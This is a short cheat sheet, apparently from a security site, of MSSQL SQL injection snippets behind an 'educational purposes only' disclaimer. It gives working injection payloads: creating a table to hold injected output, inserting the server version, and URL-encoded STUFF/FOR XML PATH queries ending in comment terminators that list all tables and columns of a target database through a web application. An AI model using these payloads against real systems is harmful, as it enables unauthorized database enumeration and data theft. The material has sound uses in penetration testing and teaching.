
Warning
==============

All the information provided on this site is for educational purposes only.

The site or the authors are not responsible for any misuse of the information.

You shall not misuse the information to gain unauthorized access and/or write malicious programs.

These information shall only be used to expand knowledge and not for causing malicious or damaging attacks.

MSSQL Server Useful Queries and notes
===========
############## CREATING A TABLE TO STORE INJECTION DATA ##############

Create a table to inject into:
```sql
CREATE TABLE YOUNAMEYOURTABLE ( ID int IDENTITY(1,1) PRIMARY KEY,  data varchar(8000));--
```
Insert data into your table:
```sql
insert into YOUNAMEYOURTABLE (data) Select @@Version--
```
Grab All the Database Tables into 1 record separated by a ';'

if not using a web application, replace the %2b with a +
```sql
%2bSTUFF((SELECT '; ' %2b TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 
'BASE TABLE' AND TABLE_CATALOG='REPLACEME' FOR XML PATH('')), 1, 1, '')--
```
Grab All the Table Columns into 1 record separated by a ';'

if not using a web application, replace the %2b with a +
```sql
SELECT 'PutTheTableNameHereForReference: ' %2bSTUFF((SELECT '; ' 
%2b column_name FROM TheDatabaseYouWantToQueryFrom.INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='REPLACEME' 
FOR XML PATH('')), 1, 1, '')--
```
